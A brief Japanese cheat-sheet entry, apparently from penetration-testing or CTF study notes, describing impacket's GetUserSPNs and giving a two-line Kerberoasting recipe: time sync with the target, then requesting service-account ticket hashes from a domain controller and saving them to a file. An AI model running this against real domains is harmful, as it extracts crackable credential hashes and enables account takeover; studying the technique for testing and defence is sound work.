# GetUserSPNsとは
サービスアカウントのパスワードハッシュを、ドメイン全体から抜き出すためのツール

## Kerberoasting
```bash
sudo ntpdate <ターゲット> # 時刻同期
impacket-GetUserSPNs -dc-ip <ターゲット> <ドメイン>/<ユーザー>:<パスワード> -request -outputfile <保存名> -save 
```
